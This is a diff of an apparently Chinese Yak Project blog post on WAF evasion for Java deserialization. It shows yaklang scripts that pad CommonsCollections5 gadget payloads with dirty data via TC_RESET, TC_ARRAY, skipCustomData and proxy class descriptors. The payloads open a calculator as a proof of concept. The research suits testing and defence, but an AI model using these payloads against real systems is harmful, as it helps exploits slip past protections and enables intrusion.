@@ -11,14 +11,8 @@ Z3r0ne  Yak Project   2024-03-22 17:30
 **前言**  
   
 有师傅提出了 Yso JavaHack 的生成序列化payload需要填充脏数据的需求，由于yak引擎没有java环境，所以不能直接对gadget封装，只能对数据化流操作，记录下分析过程。  
-#   
-#   
   
-**什么是脏数据**  
-  
-![](/articles/wechat2md-151d5edc5897dd0c05900660571b46ab.png)  
-  
-#   
+# **什么是脏数据**  
   
 什么是脏数据，为什么需要填充脏数据？先说脏数据的作用是绕过WAF的检查，那WAF是如何检查payload的？  
   
@@ -27,11 +21,8 @@ Z3r0ne  Yak Project   2024-03-22 17:30
 如果是查aced头这种无差别拦截，那payload就没什么变形法子了，但如果查关键词，主要也就是一些gadget常用的类名，那可以想办法在不影响序列化流解析的前提下，在类名前塞一些数据，将实际生效的payload放在后面，绕过WAF检查。  
   
   
-**寻找slot**  
+# **寻找slot**  
   
-![](/articles/wechat2md-151d5edc5897dd0c05900660571b46ab.png)  
-  
-#   
   
 Java序列化数据是一种格式化数据，不能无脑插入脏数据，需要找到一种合法方式在不影响序列化流正常解析的情况下塞脏数据。  
   
@@ -42,11 +33,8 @@ Java序列化数据是一种格式化数据，不能无脑插入脏数据，需�
 do{
     b = reader.ReadByte()
 }while(b == 0x00)
-```  
-```
-
-```  
-1. 递归解析数据流，前面可以塞任意数据，只要最后一次反序列化成功就ok,例如  
+```   
+2. 递归解析数据流，前面可以塞任意数据，只要最后一次反序列化成功就ok,例如  
   
 ```
 func readObject(stream) {
@@ -54,28 +42,19 @@ func readObject(stream) {
     ....
     readObject(stream)
 }
-```  
-```
-
-```  
+```   
   
 读一下ObjectInputStream的流程，重点看一下可能塞脏数据的逻辑，发现了几个可利用的位置。  
   
   
-**Append脏数据**  
+# **Append脏数据**  
   
-![](/articles/wechat2md-151d5edc5897dd0c05900660571b46ab.png)  
-  
-#   
   
 反序列化是从流中读取数据，当解析出一个完整对象就会结束反序列化流程。所以最简单暴力的方法就是直接append脏数据，但缺点是只能加到payload后，如果WAF只查前几个TCP报文，还是会被查。  
   
   
-**TC_RESET**  
-  
-![](/articles/wechat2md-151d5edc5897dd0c05900660571b46ab.png)  
-  
-#   
+# **TC_RESET**  
+   
   
 在readObject0方法中看到这样一段代码  
 ```
@@ -85,16 +64,9 @@ while ((tc = bin.peekByte()) == TC_RESET) {
     handleReset();
 }
 ```  
-```
-
-```  
-  
 这段代码可以理解为忽略所有TC_RESET，并调用handleReset，handleReset的作用是清空handle表，在序列化刚开始时清空handle表是没有影响的。这段代码运行在readObject0的开头，所以可以理解为忽略序列化数据前的所有TC_RESET  
   
 使用yak编写一段脚本验证猜想，成功弹出计算器。  
-```
-
-```  
 ```
 serIns = yso.GetCommonsCollections5JavaObject("open /System/Applications/Calculator.app")~
 payload = yso.ToBytes(serIns)~
@@ -106,17 +78,9 @@ res = string(payload[:4]) + dirtyData+ string(payload[4:])
 
 println(codec.EncodeBase64(res))
 ```  
-```
-
-
-
-```  
   
-**TC_ARRAY**  
+# **TC_ARRAY**  
   
-![](/articles/wechat2md-151d5edc5897dd0c05900660571b46ab.png)  
-  
-#   
   
 readObject0的执行流程是先读对象类型，再根据类型采取不同的处理方式，如类型为ARRAY使用readArray处理。readArray的执行流程是，读classDesc，读长度，创建数组，根据数组长度，循环readObject读取数组元素。  
   
@@ -125,18 +89,15 @@ readObject0的执行流程是先读对象类型，再根据类型采取不同的
 在构造payload前需要准备一下：  
 1. 构造classDesc  
   
-用java代码生成一个序列化的Object[]对象：rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwcA==  
-，  
+用java代码生成一个序列化的Object[]对象:  
+> rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwcA==  
   
 编写yaklang脚本读取其中的classDesc  
 ```
-objArrayIns = yso.GetJavaObjectFromBytes(codec.DecodeBase64("rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwcA==")~)~
+objArrayIns = yso.GetJavaObjectFromBytes(codec.DecodeBase64("rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwcA==")~)~  
 descSer = yso.ToBytes(objArrayIns.JavaSerializable.ClassDesc)~
-```  
-```
-
-```  
-1. 数组长度  
+```    
+2. 数组长度  
   
 这是java源码：  
 ```
@@ -149,9 +110,6 @@ public final int readInt() throws IOException {
         throw new EOFException();
     return ((ch1 << 24) + (ch2 << 16) + (ch3 << 8) + (ch4 << 0));
 }
-```  
-```
-
 ```  
   
 数组长度是一个int，占4个字节，使用大端存储，测试时可以暂时使用b"\x00\x00\x00\x02"。  
@@ -169,9 +127,6 @@ dirtyData += string(descSer[4:]) // 去掉magic header
 dirtyData += "\x00\x00\x00\x02" // 数组长度是2
 res = string(payload[:4]) + dirtyData+ string(payload[4:])
 println(codec.EncodeBase64(res))
-```  
-```
-
 ```  
   
 在验证payload时发现报错：  
@@ -216,18 +171,11 @@ dirtyData += "\x7B"
 res = string(payload[:4]) + dirtyData+ string(payload[4:])
 println(codec.EncodeBase64(res))
 ```  
-```
-
-```  
   
 但缺点是解析的对象会强转为IOException并抛出，控制台不太好看。  
   
   
-**skipCustomData**  
-  
-![](/articles/wechat2md-151d5edc5897dd0c05900660571b46ab.png)  
-  
-#   
+## **skipCustomData**  
   
 在readNonProxyDesc时先解析了classDesc，再调用了skipCustomData方法，skipCustomData方法中调用了readObject0，思路和前面分析的 "递归解析数据流" 相同。也就是说，可以在gadget前随便塞classDesc，不影响gadget解析。  
   
@@ -246,9 +194,6 @@ dirtyData += string(descSer[4:-2]) // 塞两个试试
 dirtyData += "\x7b"
 res = string(payload[:4]) + dirtyData+ string(payload[4:])
 println(codec.EncodeBase64(res))
-```  
-```
-
 ```  
   
 上面脚本中需要注意的是classDesc在dump出来后，最后一个字符是class的父类，这里是TC_NULL，倒数第二个字符是块结束符，这里是TC_ENDBLOCKDATA，需要去掉。  
@@ -271,16 +216,9 @@ dirtyData += "\x7b"
 res = string(payload[:4]) + dirtyData+ string(payload[4:])
 println(codec.EncodeBase64(res))
 ```  
-```
-
-```  
-  
 再看skipCustomData函数除了readObject0，还循环调用了skipBlockData，明显是用来跳过数据块的，所以猜测可以在原本gadget的classDesc后加几个数据块，在反序列化时会自动跳过，完全不影响正常解析，但可能gadget第一层的class被WAF标记，所以还是要在gadget前加一个classDesc。  
   
-再写个脚本测试下：  
-```
-
-```  
+再写个脚本测试下：   
 ```
 objArraySer = codec.DecodeBase64("rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwcA==")~
 objArrayIns = yso.GetJavaObjectFromBytes(objArraySer)~
@@ -298,22 +236,11 @@ dirtyData += "\x7b"
 res = string(payload[:5]) + dirtyData+ string(payload[4:])
 
 println(codec.EncodeBase64(res))
-```  
-```
-
-
-```  
+``` 
   
-**TC_PROXYCASSDESC**  
+# **TC_PROXYCASSDESC**  
   
-![](/articles/wechat2md-151d5edc5897dd0c05900660571b46ab.png)  
-  
-#   
-  
-在解析proxyClassDesc时会先解析代理头，再继续解析class。所以可以给gadget加个代理头,而代理头可以无限塞接口名。  
-```
-
-```  
+在解析proxyClassDesc时会先解析代理头，再继续解析class。所以可以给gadget加个代理头,而代理头可以无限塞接口名。   
 ```
 serIns = yso.GetCommonsCollections5JavaObject("open /System/Applications/Calculator.app")~
 payload = yso.ToBytes(serIns)~
@@ -329,16 +256,8 @@ newPayload += string(payload[4:]) // classData
 
 println(codec.EncodeBase64(newPayload))
 ```  
-```
-
-
-```  
   
-**总结**  
-  
-![](/articles/wechat2md-151d5edc5897dd0c05900660571b46ab.png)  
-  
-#   
+# **总结**    
   
 TC_RESET是最简单的，适合临时测试时手工加，而且对解析流程影响不大，但大量的TC_RESET在aced流中特征挺明显的。  
   
@@ -346,8 +265,7 @@ handle table错乱的问题可以暂时用\x7b解决，但会抛出异常。除�
   
 Java更新迭代了这么多版本，为了兼容性，不可避免的做一些兼容处理，除了上述的方式应该还有很多办法，但贵不在多，目前觉得比较好用的是外面包一层TC_ARRAY，生成的payload是标准序列化流，兼容性最好，后面会在Yso JavaHack中采用这种方式塞脏数据。  
   
-**参考：**  
-#   
+## **参考：**    
   
 https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ  
   
@@ -358,73 +276,25 @@ https://y4tacker.github.io/2022/02/05/year/2022/2/%E5%AF%B9Java%E5%8F%8D%E5%BA%8
   
   
   
-  
-  
-**更新日志**  
-****   
-  
-  
-**Yaklang  1.3.1-sp5**  
-  
-****  
-1. 修复内置插件的不合理写法和SSA提示  
-  
-2. Web Fuzzer 新增参数替换功能  
-  
-3. 修复 MITM 对下游代理的不恰当处理  
-  
-4. 修复 nuclei 调试的 BUG  
-  
-5. 修复动态标签的 BUG  
-  
-6. 修复了一个循环体定义域在并发情况下的不恰当处理  
-  
-7. 优化了可变参数情况下的代码补全行为  
-  
-  
-  
-  
-**Yakit  1.3.1-sp4**  
-  
-  
-1. 端口扫描UI升级  
-  
-2. 端口扫描新增参数JS SSA解析，修复扫描时cpu飙升问题  
-  
-3. WebFuzzer新增cookie、get参数、post参数、header配置  
-  
-4. History优化染色展示  
-  
-5. 菜单栏增加渲染fuzztag功能  
-  
-6. 启动MITM后可选择收起侧边栏  
-  
-7. 数据包缓存美化状态，且美化加入header  
-  
-8. Webfuzzer请求增加美化功能  
-  
-  
-  
-  
-   
-**YAK官方资源******  
+ **YAK官方资源**  
   
   
 Yak 语言官方教程：  
-https://yaklang.com/docs/intro/Yakit 视频教程：  
-https://space.bilibili.com/437503777Github下载地址：  
-https://github.com/yaklang/yakitYakit官网下载地址：  
-https://yaklang.com/Yakit安装文档：  
-https://yaklang.com/products/download_and_installYakit使用文档：  
-https://yaklang.com/products/intro/常见问题速查：  
+https://yaklang.com/docs/intro/Yakit   
+视频教程：  
+https://space.bilibili.com/437503777Github  
+下载地址：  
+https://github.com/yaklang/yakitYakit  
+官网下载地址：  
+https://yaklang.com/Yakit  
+安装文档：  
+https://yaklang.com/products/download_and_install  
+Yakit使用文档：  
+https://yaklang.com/products/intro/  
+常见问题速查：  
 https://yaklang.com/products/FAQ  
   
-![](/articles/wechat2md-5408ebaecab12337dcc9232ada0921cf.jpeg)  
-  
-**长按识别添加工作人员**  
-  
+![](/articles/wechat2md-85062b6e6c63b9d9d17d1e2a5ca2ec01.other)  
+长按识别添加工作人员
 开启Yakit进阶之旅  
-  
-![](/articles/wechat2md-303164dd51d110a795ae0eb9b5e5275b.png)  
-  
-  
+![](/articles/wechat2md-14665f86963c7c123b43378ebc55bb0f.other)
